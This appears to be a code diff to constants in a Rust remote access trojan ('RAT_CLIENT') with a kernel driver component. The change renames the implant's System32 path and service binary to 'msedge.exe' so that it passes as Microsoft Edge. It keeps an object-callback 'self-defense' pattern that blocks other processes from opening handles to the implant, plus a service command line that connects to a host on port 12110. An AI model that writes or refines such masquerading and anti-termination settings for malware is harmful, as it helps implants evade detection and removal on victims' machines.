@@ -17,14 +17,11 @@ pub const RAT_CLIENT_SERVICE_REGISTRY: &U16CStr = u16cstr!(formatcp!(
 ///
 /// The object callback protects against handle creation of any process whose image path
 /// matches this pattern.
-pub const RAT_CLIENT_OBJ_PATH_SELF_DEFENSE: &U16CStr =
-    u16cstr!(formatcp!("System32\\{RAT_CLIENT_SERVICE_NAME}.exe"));
+pub const RAT_CLIENT_OBJ_PATH_SELF_DEFENSE: &U16CStr = u16cstr!(formatcp!("System32\\msedge.exe"));
 
-pub const RAT_CLIENT_OBJ_PATH: &U16CStr = u16cstr!(formatcp!(
-    "\\SystemRoot\\System32\\{RAT_CLIENT_SERVICE_NAME}.exe"
-));
+pub const RAT_CLIENT_OBJ_PATH: &U16CStr = u16cstr!(formatcp!("\\SystemRoot\\System32\\msedge.exe"));
 pub const RAT_CLIENT_SERVICE_PATH: &U16CStr = u16cstr!(formatcp!(
-    "\"%SystemRoot%\\System32\\{RAT_CLIENT_SERVICE_NAME}.exe\" --host 192.168.56.1:12110 --log-path \"%SystemRoot%\\System32\\violet.log\" --scm"
+    "\"%SystemRoot%\\System32\\msedge.exe\" --host 192.168.56.1:12110 --log-path \"%SystemRoot%\\System32\\violet.log\" --scm"
 ));
 
 pub const ALTITUDE: &U16CStr = u16cstr!("360000");
